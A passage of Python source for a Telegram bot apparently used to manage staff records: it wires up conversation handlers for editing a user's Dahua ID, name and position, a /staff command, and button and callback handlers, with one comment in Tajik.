            EDIT_DAHUA_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, edit_got_dahua_id)],
            EDIT_NAME:     [MessageHandler(filters.TEXT & ~filters.COMMAND, edit_got_name)],
            EDIT_POSITION: [MessageHandler(filters.TEXT & ~filters.COMMAND, edit_got_position)],
        },
        fallbacks=[CommandHandler("cancel", add_cancel)],
    )
    app.add_handler(edit_user_conv)

    app.add_handler(CommandHandler("staff", cmd_staff))

    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button))
    # on_callback edit_ -ро намегирад — edit_user_conv идора мекунад
    app.add_handler(CallbackQueryHandler(on_callback))

    return app
